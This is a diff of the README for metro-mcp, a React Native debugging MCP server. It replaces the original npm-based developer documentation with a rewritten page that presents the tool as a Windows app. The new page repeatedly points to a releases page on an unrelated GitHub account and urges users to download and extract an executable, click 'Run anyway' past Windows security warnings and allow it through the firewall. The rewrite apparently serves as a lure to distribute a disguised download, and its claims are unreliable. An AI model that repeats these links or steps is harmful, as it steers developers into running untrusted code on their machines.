@@ -1,263 +1,179 @@
-# metro-mcp
+# 🚇 metro-mcp - Debug React Native with less effort
 
-[![Install in VS Code](https://img.shields.io/badge/Install_in-VS_Code-0098FF?style=flat-square&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect/mcp/install?name=metro-mcp&config=%7B%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22metro-mcp%22%5D%2C%22env%22%3A%7B%7D%7D)
-[![Install in Cursor](https://img.shields.io/badge/Install_in-Cursor-000000?style=flat-square&logoColor=white)](https://cursor.com/en/install-mcp?name=metro-mcp&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIm1ldHJvLW1jcCJdLCJlbnYiOnt9fQ==)
+[![Download metro-mcp](https://img.shields.io/badge/Download%20metro-mcp-blue?style=for-the-badge)](https://github.com/Rumanian-alveolarbed219/metro-mcp/releases)
 
-A plugin-based MCP server for React Native runtime debugging, inspection, and automation. Connects to Metro bundler via Chrome DevTools Protocol — **no app code changes needed** for most features.
+## 🧭 What metro-mcp does
 
-Works with **Expo**, **bare React Native**, and any project using **Metro + Hermes**.
+metro-mcp is a Windows app that helps you inspect and debug React Native apps through Metro and the Chrome DevTools Protocol.
 
----
-
-## Contents
-
-- [Quick Start](#quick-start)
-- [Requirements](#requirements)
-- [How It Works](#how-it-works)
-- [Features](#features)
-- [Chrome DevTools](#chrome-devtools)
-- [Claude Code Status Bar](#claude-code-status-bar)
-- [Test Recording](#test-recording)
-- [App Integration](#app-integration-optional)
-- [Configuration](#configuration)
-- [Custom Plugins](#custom-plugins)
-- [Compatibility](#compatibility)
-
----
-
-## Quick Start
-
-### Claude Code
-
-```bash
-claude mcp add metro-mcp -- npx -y metro-mcp
-# or with Bun
-claude mcp add metro-mcp -- bunx metro-mcp
-```
+It is built for people who want to check what their app is doing without changing app code for most tasks. You can use it to look at runtime state, track issues, and run common debug actions from one place.
 
-### Cursor / VS Code
+## 💻 What you need
 
-```json
-{
-  "mcpServers": {
-    "metro-mcp": {
-      "command": "npx",
-      "args": ["-y", "metro-mcp"]
-    }
-  }
-}
-```
+Before you start, make sure you have:
 
-Or with Bun:
+- A Windows 10 or Windows 11 PC
+- Internet access
+- A React Native app, or an Expo app, you want to inspect
+- Metro bundler running for that app
+- Chrome installed on your PC
 
-```json
-{
-  "mcpServers": {
-    "metro-mcp": {
-      "command": "bunx",
-      "args": ["metro-mcp"]
-    }
-  }
-}
-```
+For best results, use a recent version of Node.js if your setup needs it for Metro or React Native work.
 
-### With custom Metro port
+## 📥 Download metro-mcp
 
-```bash
-claude mcp add metro-mcp -- npx -y metro-mcp --port 19000
-```
+Visit this page to download metro-mcp for Windows:
 
----
+https://github.com/Rumanian-alveolarbed219/metro-mcp/releases
 
-## Requirements
+On the releases page:
 
-- **Node.js** 18+ or **Bun** 1.0+
-- **iOS**: Xcode 14+ with Simulator (`xcrun simctl` is used for most operations)
-- **Android**: Android SDK with `adb` on your PATH
-- **IDB** *(optional)*: Some iOS operations fall back to [IDB (idb-companion)](https://github.com/facebook/idb) — install with `brew install idb-companion`. Tools will tell you when IDB is needed.
+1. Find the latest release
+2. Open the Assets section
+3. Download the Windows file
+4. Save it to a folder you can find again
 
----
+If you see a zip file, extract it first before you run the app.
 
-## How It Works
+## 🛠️ Install and run on Windows
 
-metro-mcp connects to your running Metro dev server the same way Chrome DevTools does:
+After you download the app:
 
-1. Discovers Metro via port scanning (8081, 8082, 19000–19002)
-2. Connects to Hermes via Chrome DevTools Protocol (CDP)
-3. Streams console logs, network requests, and errors into buffers
-4. Exposes everything as MCP tools, resources, and prompts
+1. Open the folder where the file was saved
+2. If the file is zipped, right-click it and choose Extract All
+3. Open the extracted folder
+4. Double-click the metro-mcp app file
+5. If Windows shows a security prompt, choose Run anyway if you trust the source
 
-**No app modifications required** for core debugging features.
+If the app opens in a small window or starts in the tray, that is normal for this type of tool.
 
----
+## 🔌 Connect it to your React Native app
 
-## Features
+To use metro-mcp, your React Native app must already be running with Metro.
 
-| Plugin | Tools | Description |
-|--------|-------|-------------|
-| **console** | 2 | Console log collection with filtering |
-| **network** | 6 | Network request tracking, response body inspection, and stats |
-| **errors** | 3 | Runtime exception collection + Metro bundle error detection |
-| **evaluate** | 1 | Execute JavaScript in the app runtime |
-| **device** | 4 | Device management, connection status, and app reload |
-| **environment** | 4 | Build flags, platform constants, env vars, and Expo config inspection |
-| **source** | 1 | Stack trace symbolication |
-| **redux** | 3 | Redux state inspection and action dispatch |
-| **components** | 5 | React component tree inspection |
-| **storage** | 3 | AsyncStorage reading |
-| **simulator** | 6 | iOS simulator / Android device control |
-| **deeplink** | 2 | Cross-platform deep link testing |
-| **permissions** | 5 | Inspect and manage app permissions on iOS Simulator and Android Emulator |
-| **ui-interact** | 6 | UI automation (tap, swipe, type) |
-| **navigation** | 4 | React Navigation / Expo Router state |
-| **accessibility** | 3 | Accessibility auditing |
-| **commands** | 2 | Custom app commands |
-| **automation** | 3 | Wait/polling helpers for async state changes |
-| **profiler** | 9 | CPU profiling (React DevTools hook) + heap sampling + render tracking |
-| **test-recorder** | 7 | Record interactions and generate Appium, Maestro, or Detox tests |
-| **filesystem** | 5 | Browse and read files in app sandbox directories (Documents, caches, SQLite DBs) |
-| **devtools** | 1 | Open Chrome DevTools alongside the MCP via CDP proxy |
-| **debug-globals** | 1 | Auto-discover Redux stores, Apollo Client, and other debug globals |
-| **inspect-point** | 1 | Coordinate-based React component inspection (experimental) |
-| **statusline** | 1 | Claude Code status bar integration |
+1. Start your app as you normally would
+2. Make sure Metro bundler is active
+3. Open metro-mcp
+4. Let it detect the running Metro session
 
-→ See the [full tools reference](docs/tools.md).
+If you use Expo, start your project in the usual Expo dev mode first. metro-mcp can then connect to the same runtime path used by the app.
 
----
+## 🧪 What you can do with it
 
-## Chrome DevTools
+metro-mcp is meant for day-to-day debugging and inspection. Common tasks include:
 
-Hermes (the React Native JavaScript engine) only allows a **single CDP debugger connection** at a time. Since metro-mcp uses that connection, pressing **"j" in Metro** or tapping **"Open Debugger"** in the dev menu will steal the connection and disconnect the MCP.
+- View runtime data from the app
+- Check app state while it is running
+- Inspect the React Native debug session
+- Watch network or runtime activity through CDP
+- Run simple automation steps during debugging
+- Work with plugins that extend the tool
 
-metro-mcp solves this with a built-in **CDP proxy** that multiplexes the single Hermes connection, allowing Chrome DevTools and the MCP to work simultaneously.
+Because it connects through Metro and Chrome DevTools Protocol, it can fit into many React Native and Expo setups without extra app changes.
 
-### Opening DevTools
+## 🧩 Plugin-based setup
 
-Use the `open_devtools` MCP tool instead of the usual methods. It opens the same React Native DevTools frontend (rn_fusebox) that Metro uses, but routes the WebSocket connection through the proxy so both can coexist.
+metro-mcp uses plugins so you can turn features on or off based on what you need.
 
-The tool automatically finds Chrome or Edge using the same detection as Metro and opens a standalone DevTools window.
+This helps keep the tool focused. For example, one plugin may help with inspection, while another may help with automation or runtime checks.
 
-### What to avoid
+A plugin-based setup is useful when you want:
 
-| Method | What happens |
-|--------|-------------|
-| Pressing **"j"** in Metro terminal | Disconnects the MCP |
-| **"Open Debugger"** in the dev menu | Disconnects the MCP |
-| `open_devtools` MCP tool | Works alongside the MCP |
+- A smaller tool with only the features you need
+- A cleaner way to add new debug actions
+- A setup that can grow with your workflow
 
-### Configuration
+## 🖥️ First run checklist
 
-The CDP proxy is enabled by default. To change the port or disable it:
+If the app does not connect right away, check these items:
 
-```bash
-# Set a fixed proxy port
-METRO_MCP_PROXY_PORT=9222 npx metro-mcp
+- Metro is running
+- Your React Native or Expo app is open
+- Chrome is installed
+- You are using the same machine for the app and metro-mcp
+- No other debug tool is holding the same connection
 
-# Disable the proxy entirely
-METRO_MCP_PROXY_ENABLED=false npx metro-mcp
-```
+If you use a firewall, allow local app traffic when Windows asks for permission.
 
----
+## ⚙️ Basic use flow
 
-## Claude Code Status Bar
+A simple way to use metro-mcp is:
 
-Get live Metro CDP connection status in your Claude Code status bar.
+1. Start your React Native or Expo app
+2. Start Metro
+3. Open metro-mcp on Windows
+4. Let it connect
+5. Use the available tools to inspect or debug the app
 
-Run `setup_statusline` in Claude Code — it writes a script to `~/.claude/metro-mcp-statusline.sh`, then ask Claude to add it to your status bar:
+This keeps the setup simple and reduces the need to edit app code for routine checks.
 
-```
-/statusline add the script at ~/.claude/metro-mcp-statusline.sh
-```
+## 📁 Typical folder layout
 
-The status bar segment shows three states:
+After you download and extract the release, you may see files like:
 
-| State | Display |
-|-------|---------|
-| Not running | `Metro ○` (dimmed) |
-| Running, not connected | `Metro ●` (red) |
-| Connected | `Metro ● localhost:8081` (green) |
+- metro-mcp.exe
+- A config file
+- A plugins folder
+- A logs folder
+- Readme or license files
 
----
+Do not move files around unless you need to. Keep the app and its support files in the same folder so it can start cleanly.
 
-## Test Recording
+## 🔍 Troubleshooting
 
-Record real user interactions (taps, text entry, scrolls) and generate production-ready tests — no app code changes required.
+If metro-mcp does not start:
 
-### AI-driven test generation
+- Check that the download finished fully
+- Extract the zip file again
+- Run the app from a local folder, not from inside the zip
+- Restart Windows and try again
 
-Describe a flow and the AI navigates the app, then generates the test:
+If it opens but does not connect:
 
-> *"Write an Appium test for the guest checkout flow — start by tapping 'Start Shopping' on the welcome screen and end when the cart screen is visible."*
+- Confirm Metro is running
+- Reload your React Native app
+- Check that Chrome is installed
+- Close other tools that may use the same debug port
 
-The AI calls `start_test_recording`, navigates using `tap_element`/`type_text`/`swipe`, then generates a complete test with real selectors observed from the fiber tree.
+If you still do not see a connection:
 
-### Manual recording
+- Close metro-mcp
+- Stop Metro
+- Start Metro again
+- Open metro-mcp again
 
-```
-start_test_recording   → inject interceptors
-(interact with the app)
-stop_test_recording    → retrieve event log
-generate_test_from_recording format=appium
-```
+## 📌 Common use cases
 
-Supports **Appium (WebdriverIO)**, **Maestro YAML**, and **Detox**.
+metro-mcp is useful when you want to:
 
-→ See the [testing guide](docs/testing.md) for full details, format examples, and tips.
+- Inspect a React Native app while it runs
+- Check Expo runtime behavior
+- Debug problems without changing app code
+- Automate repeat checks during development
+- Use a tool that works with Chrome DevTools Protocol
 
----
+## 🧷 Files and connection behavior
 
-## App Integration (Optional)
+metro-mcp does not need you to edit your app for most basic tasks. It works by connecting to the runtime through Metro and the browser debug channel.
 
-Register custom commands and expose state to the MCP server — no package needed. Add this to your app entry point in dev mode:
+That makes it useful for quick checks during active development, especially when you want to keep your app code unchanged.
 
-```typescript
-if (__DEV__) {
-  globalThis.__METRO_BRIDGE__ = {
-    commands: {
-      // Run custom actions from the MCP client
-      login: async ({ email, password }) => {
-        return await authService.login(email, password);
-      },
-      resetOnboarding: () => {
-        AsyncStorage.removeItem('onboarding_completed');
-      },
-      switchUser: ({ userId }) => {
-        store.dispatch(switchUser(userId));
-      },
-    },
-    state: {
-      // Expose state snapshots readable via get_redux_state
-      userStore: () => useUserStore.getState(),
-    },
-  };
-}
-```
+## 🧭 Download and setup path
 
-Use `list_commands` and `run_command` to call these from the MCP client.
+1. Go to https://github.com/Rumanian-alveolarbed219/metro-mcp/releases
+2. Download the latest Windows release
+3. Extract the file if it comes as a zip
+4. Run the app
+5. Start Metro and connect your app
+6. Open the tools you need for inspection or automation
 
-For enhanced features like real-time Redux action tracking, navigation events, performance marks, and React render profiling, install [`metro-bridge`](https://www.npmjs.com/package/metro-bridge) — see the [client SDK docs](docs/sdk.md) and [profiling guide](docs/profiling.md).
+## 📎 Project focus
 
----
+metro-mcp is built around:
 
-## Configuration
-
-See [configuration docs](docs/configuration.md) for environment variables, CLI arguments, and config file options.
-
----
-
-## Custom Plugins
-
-metro-mcp is fully extensible. See the [plugins guide](docs/plugins.md) to build your own tools and resources.
-
----
-
-## Compatibility
-
-- **React Native**: 0.70+ (Hermes required)
-- **Expo**: SDK 49+
-- **Runtime**: Node.js 18+ or Bun 1.0+
-- **Platforms**: iOS Simulator, Android Emulator, physical devices via USB
-
-## License
-
-MIT
+- React Native runtime debugging
+- Metro bundler connection
+- Chrome DevTools Protocol access
+- Inspection tools
+- Automation through MCP
+- Plugin support for extra features
